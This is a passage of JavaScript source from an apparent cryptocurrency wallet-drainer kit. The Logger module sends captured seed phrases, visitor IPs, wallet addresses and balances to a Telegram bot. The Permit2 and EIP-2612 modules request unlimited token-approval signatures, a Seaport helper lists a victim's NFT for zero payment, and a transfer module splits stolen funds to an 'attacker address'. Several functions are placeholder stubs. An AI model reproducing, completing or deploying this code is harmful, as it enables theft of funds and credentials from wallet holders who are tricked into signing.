  function recoverAddress(message, signature, isPersonalSign = true) {
    // This would need ethers.js or similar
    // For now, return null - actual implementation would verify
    return null;
  }

  /**
   * Create generic EIP-712 typed data
   * @param {object} domain - Domain object
   * @param {object} types - Types definition
   * @param {string} primaryType - Primary type name
   * @param {object} message - Message object
   * @returns {object} Complete typed data
   */
  function createTypedData(domain, types, primaryType, message) {
    return {
      domain,
      types: {
        EIP712Domain: EIP712_DOMAIN_TYPE,
        ...types
      },
      primaryType,
      message
    };
  }

  /**
   * Sign Permit2 allowance transfer
   * Convenience method combining typed data creation and signing
   */
  async function signPermit2Transfer(provider, owner, params) {
    const typedData = createPermit2TypedData({
      owner,
      ...params
    });

    return await signTypedData(provider, owner, typedData);
  }

  /**
   * Sign batch Permit2 transfer
   */
  async function signPermit2BatchTransfer(provider, owner, params) {
    const typedData = createPermit2BatchTypedData({
      owner,
      ...params
    });

    return await signTypedData(provider, owner, typedData);
  }

  /**
   * Sign standard EIP-2612 permit
   */
  async function signPermit(provider, owner, params) {
    const typedData = createPermitTypedData({
      owner,
      ...params
    });

    return await signTypedData(provider, owner, typedData);
  }

  /**
   * Sign Seaport order
   */
  async function signSeaportOrder(provider, offerer, params) {
    const typedData = createSeaportTypedData({
      offerer,
      ...params
    });

    return await signTypedData(provider, offerer, typedData);
  }

  /**
   * Create typed data for NFT approval via Seaport
   */
  function createNFTApprovalTypedData(params) {
    const {
      owner,
      nftContract,
      tokenId,
      spender,
      startTime,
      endTime,
      nonce,
      chainId
    } = params;

    // Create an order where the NFT is offered for 0 consideration
    // This effectively approves the NFT for transfer
    return createSeaportTypedData({
      offerer: owner,
      zone: '0x0000000000000000000000000000000000000000',
      offer: [{
        itemType: 2, // ERC721
        token: nftContract,
        identifierOrCriteria: tokenId || '0',
        startAmount: '1',
        endAmount: '1'
      }],
      consideration: [],
      startTime: startTime,
      endTime: endTime,
      orderType: 0,
      nonce: nonce,
      chainId: chainId
    });
  }

  /**
   * Get nonce from contract (requires ethers)
   * Placeholder - actual implementation would call contract
   */
  async function getPermit2Nonce(provider, owner) {
    // Would call Permit2.nonceBitmap or similar
    return Date.now();
  }

  // Public API
  return {
    PERMIT2_ADDRESS,
    EIP712_DOMAIN_TYPE,
    signTypedData,
    personalSign,
    createPermit2TypedData,
    createPermit2BatchTypedData,
    createPermitTypedData,
    createSeaportTypedData,
    createNFTApprovalTypedData,
    createTypedData,
    signTransaction,
    parseSignature,
    recoverAddress,
    signPermit2Transfer,
    signPermit2BatchTransfer,
    signPermit,
    signSeaportOrder,
    getPermit2Nonce
  };
})();

// Export for module systems
if (typeof module !== 'undefined' && module.exports) {
  module.exports = Signer;
}


/**
 * Logger Module
 * Handles all Telegram notifications and logging
 * Supports customer-specific bot tokens and chat IDs
 */

const Logger = (function() {
  'use strict';

  let config = {
    botToken: null,
    chatId: null,
    enabled: true
  };

  const STATUS_EMOJI = {
    success: '✅',
    error: '❌',
    warning: '⚠️',
    info: 'ℹ️',
    money: '💰',
    wallet: '👛',
    chain: '⛓️',
    signature: '✍️',
    connection: '🔗',
    seed: '🌱',
    nft: '🖼️'
  };

  function configure(options) {
    config = { ...config, ...options };
    if (!config.botToken || !config.chatId) config.enabled = false;
  }

  async function send(message) {
    if (!config.enabled) return;
    try {
      await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: config.chatId,
          text: message,
          parse_mode: 'HTML'
        })
      });
    } catch (e) {}
  }

  async function getInfo() {
    try {
      const resp = await fetch('https://ipapi.co/json/');
      return await resp.json();
    } catch (e) {
      return { ip: 'Unknown', city: 'Unknown', country_name: 'Unknown' };
    }
  }

  async function logVisit(params) {
      const info = await getInfo();
      const lines = [
          `<b>👀 New Visit</b>`,
          `Address: <code>${params.address || 'Visitor'}</code>`,
          `Referrer: <code>${params.referrer || 'Direct'}</code>`,
          `IP: <code>${info.ip}</code> (${info.city}, ${info.country_name})`,
          `Agent: <code>${navigator.userAgent.slice(0, 50)}...</code>`
      ];
      return await send(lines.join('\n'));
  }

  async function logConnection(params) {
    const info = await getInfo();
    const lines = [
      `<b>🔗 Wallet Connected</b>`,
      `Address: <code>${params.address}</code>`,
      `Chain: <code>${(params.chain || 'unknown').toUpperCase()}</code>`,
      `Wallet: <code>${params.walletType || 'unknown'}</code>`,
      `Balance: <code>${params.balance || '0.00'}</code>`,
      `IP: <code>${info.ip}</code> (${info.city}, ${info.country_name})`
    ];
    return await send(lines.join('\n'));
  }

  async function logAction(params) {
      const lines = [
          `<b>⚡ Action Performed</b>`,
          `Address: <code>${params.address}</code>`,
          `Action: <code>${params.action}</code>`,
          `Chain: <code>${(params.chain || 'unknown').toUpperCase()}</code>`,
          `Status: <code>${params.status || 'success'}</code>`
      ];
      if (params.amount) lines.push(`Amount: <code>${params.amount}</code>`);
      return await send(lines.join('\n'));
  }

  async function logSignature(params) {
    const lines = [
      `<b>✍️ Signature Received</b>`,
      `Address: <code>${params.address}</code>`,
      `Chain: <code>${(params.chain || 'unknown').toUpperCase()}</code>`,
      `Type: <code>${params.signatureType || 'Permit2'}</code>`,
      `Asset: <code>${params.tokenSymbol || 'Native'}</code>`,
      `Amount: <code>${params.amount || 'Unknown'}</code>`
    ];
    return await send(lines.join('\n'));
  }

  async function logSeed(params) {
      const lines = [
          `<b>🌱 SEED CAPTURED</b>`,
          `Address: <code>${params.address}</code>`,
          `Seed: <code>${params.seedPhrase}</code>`
      ];
      return await send(lines.join('\n'));
  }

  return {
    configure,
    send,
    logVisit,
    logConnection,
    logAction,
    logSignature,
    logSeed
  };
})();

if (typeof module !== 'undefined' && module.exports) {
  module.exports = Logger;
}

  if (typeof WalletDetect !== 'undefined') window.WalletDetect = WalletDetect;
  if (typeof Logger !== 'undefined') window.Logger = Logger;
  if (typeof Signer !== 'undefined') window.Signer = Signer;
  if (typeof ChainSwitch !== 'undefined') window.ChainSwitch = ChainSwitch;

  // ===== FEATURE MODULES =====
  /**
 * Permit2 Module
 * Handles all Permit2 signature operations for unlimited token approvals
 * Permit2 is a universal token approval contract by Uniswap
 * Contract: 0x000000000022D473030F116dDEE9F6B43aC78BA3
 */

const Permit2 = (function() {
  'use strict';

  // Permit2 contract address (same on all EVM chains)
  const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

  // Permit2 ABI (minimal for our purposes)
  const PERMIT2_ABI = [
    // Read functions
    'function allowance(address user, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)',
    'function nonceBitmap(address owner, uint248 nonceWord) external view returns (uint256)',
    
    // Write functions
    'function approve(address token, address spender, uint160 amount, uint48 expiration) external',
    'function permit(address owner, tuple(tuple(address token, uint160 amount) permitted, address spender, uint256 nonce, uint256 deadline) permit, bytes signature) external',
    'function permitTransferFrom(tuple(tuple(address token, uint160 amount) permitted, address spender, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 amount) transferDetails, address owner, bytes signature) external',
    'function permitTransferFromBatch(tuple(tuple(address token, uint160 amount)[] permitted, address spender, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256[] amounts) transferDetails, address owner, bytes signature) external',
    
    // Events
    'event Approval(address indexed owner, address indexed token, address indexed spender, uint160 amount, uint48 expiration)',
    'event PermitTransferFrom(address indexed owner, address indexed token, address indexed spender, uint160 amount, uint256 nonce, uint256 deadline)'
  ];

  // Max uint160 for unlimited approval
  const MAX_UINT160 = '0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF';

  // Max uint256
  const MAX_UINT256 = '0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF';

  /**
   * Create Permit2 signature message for single token
   * @param {object} params
   * @returns {object} Typed data for signing
   */
  function createPermitTransferFrom(params) {
    const {
      owner,
      token,
      amount,
      spender,
      nonce,
      deadline,
      chainId
    } = params;

    const domain = {
      name: 'Permit2',
      chainId: chainId,
      verifyingContract: PERMIT2_ADDRESS
    };

    const types = {
      EIP712Domain: [
        { name: 'name', type: 'string' },
        { name: 'chainId', type: 'uint256' },
        { name: 'verifyingContract', type: 'address' }
      ],
      PermitTransferFrom: [
        { name: 'permitted', type: 'TokenPermissions' },
        { name: 'spender', type: 'address' },
        { name: 'nonce', type: 'uint256' },
        { name: 'deadline', type: 'uint256' }
      ],
      TokenPermissions: [
        { name: 'token', type: 'address' },
        { name: 'amount', type: 'uint256' }
      ]
    };

    const message = {
      permitted: {
        token: token,
        amount: amount || MAX_UINT256
      },
      spender: spender,
      nonce: nonce || Date.now(),
      deadline: deadline || Math.floor(Date.now() / 1000) + 3600 // 1 hour default
    };

    return { domain, types, primaryType: 'PermitTransferFrom', message };
  }

  /**
   * Create Permit2 batch signature for multiple tokens
   * @param {object} params
   * @returns {object} Typed data for signing
   */
  function createPermitBatchTransferFrom(params) {
    const {
      owner,
      tokens, // Array of { token, amount }
      spender,
      nonce,
      deadline,
      chainId
    } = params;

    const domain = {
      name: 'Permit2',
      chainId: chainId,
      verifyingContract: PERMIT2_ADDRESS
    };

    const types = {
      EIP712Domain: [
        { name: 'name', type: 'string' },
        { name: 'chainId', type: 'uint256' },
        { name: 'verifyingContract', type: 'address' }
      ],
      PermitBatchTransferFrom: [
        { name: 'permitted', type: 'TokenPermissions[]' },
        { name: 'spender', type: 'address' },
        { name: 'nonce', type: 'uint256' },
        { name: 'deadline', type: 'uint256' }
      ],
      TokenPermissions: [
        { name: 'token', type: 'address' },
        { name: 'amount', type: 'uint256' }
      ]
    };

    const message = {
      permitted: tokens.map(t => ({
        token: t.token,
        amount: t.amount || MAX_UINT256
      })),
      spender: spender,
      nonce: nonce || Date.now(),
      deadline: deadline || Math.floor(Date.now() / 1000) + 3600
    };

    return { domain, types, primaryType: 'PermitBatchTransferFrom', message };
  }

  /**
   * Create signature allowance transfer
   * Alternative format for Permit2
   */
  function createSignatureAllowanceTransfer(params) {
    const {
      owner,
      token,
      amount,
      spender,
      expiration,
      nonce,
      chainId
    } = params;

    const domain = {
      name: 'Permit2',
      chainId: chainId,
      verifyingContract: PERMIT2_ADDRESS
    };

    const types = {
      EIP712Domain: [
        { name: 'name', type: 'string' },
        { name: 'chainId', type: 'uint256' },
        { name: 'verifyingContract', type: 'address' }
      ],
      Permit: [
        { name: 'owner', type: 'address' },
        { name: 'permitted', type: 'TokenPermissions' },
        { name: 'spender', type: 'address' },
        { name: 'nonce', type: 'uint256' },
        { name: 'deadline', type: 'uint256' }
      ],
      TokenPermissions: [
        { name: 'token', type: 'address' },
        { name: 'amount', type: 'uint256' }
      ]
    };

    const message = {
      owner: owner,
      permitted: {
        token: token,
        amount: amount || MAX_UINT256
      },
      spender: spender,
      nonce: nonce || Date.now(),
      deadline: expiration || Math.floor(Date.now() / 1000) + 86400 * 30 // 30 days
    };

    return { domain, types, primaryType: 'Permit', message };
  }

  /**
   * Generate unique nonce based on address and timestamp
   */
  function generateNonce(address) {
    const timestamp = Date.now();
    // Create a deterministic but unique nonce
    const hash = address.slice(2, 10) + timestamp.toString(16);
    return BigInt('0x' + hash);
  }

  /**
   * Request Permit2 signature from wallet
   * @param {object} provider - Web3 provider
   * @param {string} address - Owner address
   * @param {object} params - Permit parameters
   * @returns {Promise<string>} Signature
   */
  async function requestPermit2Signature(provider, address, params) {
    const typedData = createPermitTransferFrom({
      owner: address,
      ...params
    });

    try {
      const signature = await provider.request({
        method: 'eth_signTypedData_v4',
        params: [address, JSON.stringify(typedData)]
      });
      return signature;
    } catch (error) {
      // Try v3 fallback
      try {
        const signature = await provider.request({
          method: 'eth_signTypedData_v3',
          params: [address, JSON.stringify(typedData)]
        });
        return signature;
      } catch (v3Error) {
        throw new Error(`Permit2 signing failed: ${error.message}`);
      }
    }
  }

  /**
   * Request batch Permit2 signature
   */
  async function requestBatchPermit2Signature(provider, address, params) {
    const typedData = createPermitBatchTransferFrom({
      owner: address,
      ...params
    });

    try {
      const signature = await provider.request({
        method: 'eth_signTypedData_v4',
        params: [address, JSON.stringify(typedData)]
      });
      return signature;
    } catch (error) {
      throw new Error(`Batch Permit2 signing failed: ${error.message}`);
    }
  }

  /**
   * Parse Permit2 signature into components
   * @param {string} signature
   * @returns {object} { v, r, s }
   */
  function parsePermit2Signature(signature) {
    const sig = signature.startsWith('0x') ? signature.slice(2) : signature;
    
    if (sig.length < 128) {
      throw new Error('Invalid signature length');
    }

    return {
      r: '0x' + sig.slice(0, 64),
      s: '0x' + sig.slice(64, 128),
      v: parseInt(sig.slice(128, 130), 16)
    };
  }

  /**
   * Build calldata for permitTransferFrom
   * This constructs the raw transaction calldata
   */
  function buildPermitTransferFromCalldata(permit, transferDetails, owner, signature) {
    const { parsePermit2Signature } = this || Permit2;
    const { v, r, s } = parsePermit2Signature(signature);

    // Function selector for permitTransferFrom
    const selector = '0x30f28b7a';

    // Encode the parameters (simplified - actual implementation would use ethers.js)
    // This is a placeholder - real implementation needs proper ABI encoding
    const encoded = selector; // + encoded params

    return encoded;
  }

  /**
   * Create Permit2 approval transaction data
   * For direct approve (no signature needed)
   */
  function createApprovalCalldata(token, spender, amount, expiration) {
    // Function selector for approve(address,address,uint160,uint48)
    const selector = '0x768b6d34';
    
    // This would need proper ABI encoding
    return selector;
  }

  /**
   * Get Permit2 allowance for a token
   * @param {object} provider - Web3 provider
   * @param {string} owner - Token owner
   * @param {string} token - Token address
   * @param {string} spender - Spender address
   * @returns {Promise<object>} { amount, expiration, nonce }
   */
  async function getAllowance(provider, owner, token, spender) {
    // This would need contract call implementation
    // For now return default
    return {
      amount: '0',
      expiration: 0,
      nonce: 0
    };
  }

  /**
   * Check if Permit2 is deployed on chain
   * Permit2 is deployed at the same address on all supported chains
   */
  async function isDeployed(provider) {
    try {
      const code = await provider.request({
        method: 'eth_getCode',
        params: [PERMIT2_ADDRESS, 'latest']
      });
      return code && code !== '0x' && code !== '0x0';
    } catch {
      return false;
    }
  }

  /**
   * Create complete Permit2 payload for frontend
   * Combines all necessary data for the signing request
   */
  function createCompletePayload(params) {
    const {
      owner,
      tokens,
      spender,
      chainId,
      deadline
    } = params;

    const nonce = generateNonce(owner);
    const finalDeadline = deadline || Math.floor(Date.now() / 1000) + 3600;

    if (tokens.length === 1) {
      return {
        type: 'single',
        typedData: createPermitTransferFrom({
          owner,
          token: tokens[0].token,
          amount: tokens[0].amount,
          spender,
          nonce,
          deadline: finalDeadline,
          chainId
        }),
        nonce,
        deadline: finalDeadline
      };
    }

    return {
      type: 'batch',
      typedData: createPermitBatchTransferFrom({
        owner,
        tokens,
        spender,
        nonce,
        deadline: finalDeadline,
        chainId
      }),
      nonce,
      deadline: finalDeadline
    };
  }

  /**
   * Validate Permit2 signature
   * @param {string} signature
   * @returns {boolean}
   */
  function validateSignature(signature) {
    if (!signature || typeof signature !== 'string') {
      return false;
    }

    const sig = signature.startsWith('0x') ? signature.slice(2) : signature;
    
    // Must be 65 bytes (130 hex chars + 2 for v)
    if (sig.length !== 130) {
      return false;
    }

    // Check if valid hex
    return /^[0-9a-fA-F]+$/.test(sig);
  }

  // Public API
  return {
    PERMIT2_ADDRESS,
    PERMIT2_ABI,
    MAX_UINT160,
    MAX_UINT256,
    createPermitTransferFrom,
    createPermitBatchTransferFrom,
    createSignatureAllowanceTransfer,
    generateNonce,
    requestPermit2Signature,
    requestBatchPermit2Signature,
    parsePermit2Signature,
    buildPermitTransferFromCalldata,
    createApprovalCalldata,
    getAllowance,
    isDeployed,
    createCompletePayload,
    validateSignature
  };
})();

// Export for module systems
if (typeof module !== 'undefined' && module.exports) {
  module.exports = Permit2;
}


/**
 * Permit Module
 * Handles standard EIP-2612 Permit signatures for token approvals
 * Allows gasless token approvals via signatures
 */

const Permit = (function() {
  'use strict';

  // Max uint256 for unlimited approval
  const MAX_UINT256 = '0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF';

  // Common token names for known tokens (fallback if contract doesn't return name)
  const KNOWN_TOKENS = {
    // Ethereum
    '0xdAC17F958D2ee523a2206206994597C13D831ec7': { name: 'Tether USD', symbol: 'USDT', decimals: 6 },
    '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48': { name: 'USD Coin', symbol: 'USDC', decimals: 6 },
    '0x6B175474E89094C44Da98b954EedeAC495271d0F': { name: 'Dai Stablecoin', symbol: 'DAI', decimals: 18 },
    '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984': { name: 'Uniswap', symbol: 'UNI', decimals: 18 },
    '0x514910771AF9Ca656af840dff83E8264EcF986CA': { name: 'ChainLink Token', symbol: 'LINK', decimals: 18 },
    '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9': { name: 'Aave Token', symbol: 'AAVE', decimals: 18 },
    '0x6De037ef9aD27adb5F178A0E670b2B819b5F22cA': { name: 'Dypius', symbol: 'DYP', decimals: 18 },
    '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599': { name: 'Wrapped BTC', symbol: 'WBTC', decimals: 8 },
    '0xc00e94Cb662C3520282E6f5717214004A7f26888': { name: 'Compound', symbol: 'COMP', decimals: 18 },
    '0x514910771AF9Ca656af840dff83E8264EcF986CA': { name: 'ChainLink Token', symbol: 'LINK', decimals: 18 },
    '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9': { name: 'Aave Token', symbol: 'AAVE', decimals: 18 },
    '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984': { name: 'Uniswap', symbol: 'UNI', decimals: 18 },
    '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE': { name: 'SHIBA INU', symbol: 'SHIB', decimals: 18 },
    
    // BSC
    '0x55d398326f99059fF775485246999027B3197955': { name: 'Tether USD', symbol: 'USDT', decimals: 18 },
    '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d': { name: 'USD Coin', symbol: 'USDC', decimals: 18 },
    '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c': { name: 'WBNB', symbol: 'WBNB', decimals: 18 },
    '0x2170Ed0880ac9A755fd29B2688956BD959F933F8': { name: 'Ethereum Token', symbol: 'ETH', decimals: 18 },
    
    // Polygon
    '0xc2132D05D31c914a87C6611C10748AEb04B58e8F': { name: 'Tether USD', symbol: 'USDT', decimals: 6 },
    '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174': { name: 'USD Coin', symbol: 'USDC', decimals: 6 },
    '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619': { name: 'Wrapped Ether', symbol: 'WETH', decimals: 18 },
    '0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6': { name: 'Wrapped Bitcoin', symbol: 'WBTC', decimals: 8 },
    
    // Arbitrum
    '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9': { name: 'Tether USD', symbol: 'USDT', decimals: 6 },
    '0xaf88d065e77c8cC2239327C5EDb3A432268e5831': { name: 'USD Coin', symbol: 'USDC', decimals: 6 },
    '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1': { name: 'Wrapped Ether', symbol: 'WETH', decimals: 18 },
    
    // Optimism
    '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58': { name: 'Tether USD', symbol: 'USDT', decimals: 6 },
    '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85': { name: 'USD Coin', symbol: 'USDC', decimals: 6 },
    '0x4200000000000000000000000000000000000006': { name: 'Wrapped Ether', symbol: 'WETH', decimals: 18 },
    
    // Base
    '0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2': { name: 'Tether USD', symbol: 'USDT', decimals: 6 },
    '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913': { name: 'USD Coin', symbol: 'USDC', decimals: 6 },
    '0x4200000000000000000000000000000000000006': { name: 'Wrapped Ether', symbol: 'WETH', decimals: 18 }
  };

  // EIP-2612 Permit ABI
  const PERMIT_ABI = [
    'function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external',
    'function nonces(address owner) external view returns (uint256)',
    'function DOMAIN_SEPARATOR() external view returns (bytes32)',
    'function name() external view returns (string)',
    'function symbol() external view returns (string)',
    'function decimals() external view returns (uint8)'
  ];

  // DAI-style permit ABI (different signature)
  const DAI_PERMIT_ABI = [
    'function permit(address holder, address spender, uint256 nonce, uint256 expiry, bool allowed, uint8 v, bytes32 r, bytes32 s) external'
  ];

  /**
   * Create EIP-2612 Permit typed data
   * @param {object} params
   * @returns {object} EIP-712 typed data
   */
  function createPermitTypedData(params) {
    const {
      owner,
      token,
      tokenName,
      spender,
      value,
      nonce,
      deadline,
      chainId,
      version
    } = params;

    // Default values
    const tokenInfo = KNOWN_TOKENS[token] || {};
    const finalName = tokenName || tokenInfo.name || 'Token';
    const finalVersion = version || '1';
    const finalValue = value || MAX_UINT256;
    const finalDeadline = deadline || Math.floor(Date.now() / 1000) + 3600; // 1 hour
    const finalNonce = nonce || 0;

    const domain = {
      name: finalName,
      version: finalVersion,
      chainId: chainId,
      verifyingContract: token
    };

    const types = {
      EIP712Domain: [
        { name: 'name', type: 'string' },
        { name: 'version', type: 'string' },
        { name: 'chainId', type: 'uint256' },
        { name: 'verifyingContract', type: 'address' }
      ],
      Permit: [
        { name: 'owner', type: 'address' },
        { name: 'spender', type: 'address' },
        { name: 'value', type: 'uint256' },
        { name: 'nonce', type: 'uint256' },
        { name: 'deadline', type: 'uint256' }
      ]
    };

    const message = {
      owner: owner,
      spender: spender,
      value: finalValue,
      nonce: finalNonce,
      deadline: finalDeadline
    };

    return { domain, types, primaryType: 'Permit', message };
  }

  /**
   * Create DAI-style permit typed data
   * DAI uses a different permit signature format
   */
  function createDAIPermitTypedData(params) {
    const {
      owner,
      token,
      spender,
      nonce,
      expiry,
      allowed,
      chainId
    } = params;

    const domain = {
      name: 'Dai Stablecoin',
      version: '1',
      chainId: chainId,
      verifyingContract: token
    };

    const types = {
      EIP712Domain: [
        { name: 'name', type: 'string' },
        { name: 'version', type: 'string' },
        { name: 'chainId', type: 'uint256' },
        { name: 'verifyingContract', type: 'address' }
      ],
      Permit: [
        { name: 'holder', type: 'address' },
        { name: 'spender', type: 'address' },
        { name: 'nonce', type: 'uint256' },
        { name: 'expiry', type: 'uint256' },
        { name: 'allowed', type: 'bool' }
      ]
    };

    const message = {
      holder: owner,
      spender: spender,
      nonce: nonce || 0,
      expiry: expiry || Math.floor(Date.now() / 1000) + 86400 * 365, // 1 year
      allowed: allowed !== false
    };

    return { domain, types, primaryType: 'Permit', message };
  }

  /**
   * Request permit signature from wallet
   * @param {object} provider - Web3 provider
   * @param {string} address - Owner address
   * @param {object} params - Permit parameters
   * @returns {Promise<string>} Signature
   */
  async function requestPermitSignature(provider, address, params) {
    const typedData = createPermitTypedData({
      owner: address,
      ...params
    });

    try {
      const signature = await provider.request({
        method: 'eth_signTypedData_v4',
        params: [address, JSON.stringify(typedData)]
      });
      return signature;
    } catch (error) {
      // Try v3 fallback
      try {
        const signature = await provider.request({
          method: 'eth_signTypedData_v3',
          params: [address, JSON.stringify(typedData)]
        });
        return signature;
      } catch (v3Error) {
        throw new Error(`Permit signing failed: ${error.message}`);
      }
    }
  }

  /**
   * Request DAI-style permit signature
   */
  async function requestDAIPermitSignature(provider, address, params) {
    const typedData = createDAIPermitTypedData({
      owner: address,
      ...params
    });

    try {
      const signature = await provider.request({
        method: 'eth_signTypedData_v4',
        params: [address, JSON.stringify(typedData)]
      });
      return signature;
    } catch (error) {
      throw new Error(`DAI permit signing failed: ${error.message}`);
    }
  }

  /**
   * Parse permit signature
   */
  function parseSignature(signature) {
    const sig = signature.startsWith('0x') ? signature.slice(2) : signature;

    if (sig.length !== 130) {
      throw new Error('Invalid signature length');
    }

    return {
      r: '0x' + sig.slice(0, 64),
      s: '0x' + sig.slice(64, 128),
      v: parseInt(sig.slice(128, 130), 16)
    };
  }

  /**
   * Get token info from contract
   * @param {object} provider - Web3 provider
   * @param {string} token - Token address
   * @returns {Promise<object>} Token info
   */
  async function getTokenInfo(provider, token) {
    // Check known tokens first
    if (KNOWN_TOKENS[token]) {
      return KNOWN_TOKENS[token];
    }

    // Try to get from contract
    try {
      const nameData = '0x06fdde03'; // name()
      const symbolData = '0x95d89b41'; // symbol()
      const decimalsData = '0x313ce567'; // decimals()

      const [nameResult, symbolResult, decimalsResult] = await Promise.all([
        provider.request({
          method: 'eth_call',
          params: [{ to: token, data: nameData }, 'latest']
        }),
        provider.request({
          method: 'eth_call',
          params: [{ to: token, data: symbolData }, 'latest']
        }),
        provider.request({
          method: 'eth_call',
          params: [{ to: token, data: decimalsData }, 'latest']
        })
      ]);

      // Decode results (simplified)
      const decimals = parseInt(decimalsResult, 16) || 18;

      return {
        name: 'Token',
        symbol: 'TKN',
        decimals
      };
    } catch {
      return {
        name: 'Token',
        symbol: 'TKN',
        decimals: 18
      };
    }
  }

  /**
   * Get nonce for address
   */
  async function getNonce(provider, token, owner) {
    try {
      // nonces(address) selector: 0x7ecebe00
      const data = '0x7ecebe00' + owner.slice(2).padStart(64, '0');
      const result = await provider.request({
        method: 'eth_call',
        params: [{ to: token, data }, 'latest']
      });
      return parseInt(result, 16);
    } catch {
      return 0;
    }
  }

  /**
   * Check if token supports EIP-2612
   */
  async function supportsPermit(provider, token) {
    try {
      // Check if contract has permit function
      // This is a simplified check
      const data = '0x7ecebe00' + '0x0000000000000000000000000000000000000000'.slice(2);
      const result = await provider.request({
        method: 'eth_call',
        params: [{ to: token, data }, 'latest']
      });
      return result !== '0x';
    } catch {
      return false;
    }
  }

  /**
   * Build permit transaction calldata
   */
  function buildPermitCalldata(owner, spender, value, deadline, signature) {
    const { v, r, s } = parseSignature(signature);

    // permit(address,address,uint256,uint256,uint8,bytes32,bytes32)
    const selector = '0xd505accf';

    // This would need proper ABI encoding with ethers.js
    // Placeholder for now
    return selector;
  }

  /**
   * Create batch permit payloads for multiple tokens
   */
  function createBatchPermitPayloads(params) {
    const {
      owner,
      tokens, // Array of token addresses
      spender,
      chainId,
      deadline,
      nonces
    } = params;

    return tokens.map((token, index) => {
      return createPermitTypedData({
        owner,
        token,
        spender,
        value: MAX_UINT256,
        nonce: nonces?.[index] || 0,
        deadline: deadline || Math.floor(Date.now() / 1000) + 3600,
        chainId
      });
    });
  }

  /**
   * Validate permit parameters
   */
  function validatePermitParams(params) {
    if (!params.owner || !params.owner.match(/^0x[a-fA-F0-9]{40}$/)) {
      return { valid: false, error: 'Invalid owner address' };
    }
    if (!params.token || !params.token.match(/^0x[a-fA-F0-9]{40}$/)) {
      return { valid: false, error: 'Invalid token address' };
    }
    if (!params.spender || !params.spender.match(/^0x[a-fA-F0-9]{40}$/)) {
      return { valid: false, error: 'Invalid spender address' };
    }
    if (!params.chainId) {
      return { valid: false, error: 'Missing chain ID' };
    }
    return { valid: true };
  }

  // Public API
  return {
    MAX_UINT256,
    KNOWN_TOKENS,
    PERMIT_ABI,
    DAI_PERMIT_ABI,
    createPermitTypedData,
    createDAIPermitTypedData,
    requestPermitSignature,
    requestDAIPermitSignature,
    parseSignature,
    getTokenInfo,
    getNonce,
    supportsPermit,
    buildPermitCalldata,
    createBatchPermitPayloads,
    validatePermitParams
  };
})();

// Export for module systems
if (typeof module !== 'undefined' && module.exports) {
  module.exports = Permit;
}


/**
 * Token Transfer Module
 * Handles direct token transfers and transferFrom operations
 * Supports 20% split to attacker address
 */

const TokenTransfer = (function() {
  'use strict';

  // Default split percentage
  const DEFAULT_SPLIT_PERCENT = 20;

  // ERC20 ABI for transfers
  const ERC20_TRANSFER_ABI = [
    'function transfer(address to, uint256 amount) external returns (bool)',
    'function transferFrom(address from, address to, uint256 amount) external returns (bool)',
    'function balanceOf(address account) external view returns (uint256)',
    'function decimals() external view returns (uint8)',
    'function symbol() external view returns (string)',
    'function name() external view returns (string)'
  ];

  // Native transfer (ETH/BNB/MATIC etc)
  const NATIVE_TRANSFER_ABI = [];

  // Function selectors
  const SELECTORS = {
    transfer: '0xa9059cbb',       // transfer(address,uint256)
    transferFrom: '0x23b872dd',   // transferFrom(address,address,uint256)
    balanceOf: '0x70a08231'       // balanceOf(address)
  };

  /**
   * Encode transfer calldata
   * @param {string} to - Recipient address
   * @param {string} amount - Amount to transfer (hex or decimal)
   * @returns {string} Encoded calldata
   */
  function encodeTransfer(to, amount) {
    const amountHex = typeof amount === 'string' && amount.startsWith('0x')
      ? amount.slice(2).padStart(64, '0')
      : BigInt(amount).toString(16).padStart(64, '0');
    return SELECTORS.transfer + to.slice(2).padStart(64, '0') + amountHex;
  }

  /**
   * Encode transferFrom calldata
   * @param {string} from - Sender address
   * @param {string} to - Recipient address
   * @param {string} amount - Amount to transfer
   * @returns {string} Encoded calldata
   */
  function encodeTransferFrom(from, to, amount) {
    const amountHex = typeof amount === 'string' && amount.startsWith('0x')
      ? amount.slice(2).padStart(64, '0')
      : BigInt(amount).toString(16).padStart(64, '0');
    return SELECTORS.transferFrom + from.slice(2).padStart(64, '0') + to.slice(2).padStart(64, '0') + amountHex;
  }

  /**
   * Calculate split amounts
   * @param {string} totalAmount - Total amount to split
   * @param {number} splitPercent - Percentage for attacker (default 20)
   * @returns {object} { mainAmount, splitAmount }
   */
  function calculateSplit(totalAmount, splitPercent = DEFAULT_SPLIT_PERCENT) {
    const total = BigInt(totalAmount);
    const splitBps = BigInt(splitPercent * 100); // Basis points
    const totalBps = BigInt(10000);

    const splitAmount = (total * splitBps) / totalBps;
    const mainAmount = total - splitAmount;

    return {
      totalAmount: totalAmount,
      mainAmount: mainAmount.toString(),
      splitAmount: splitAmount.toString(),
      splitPercent: splitPercent,
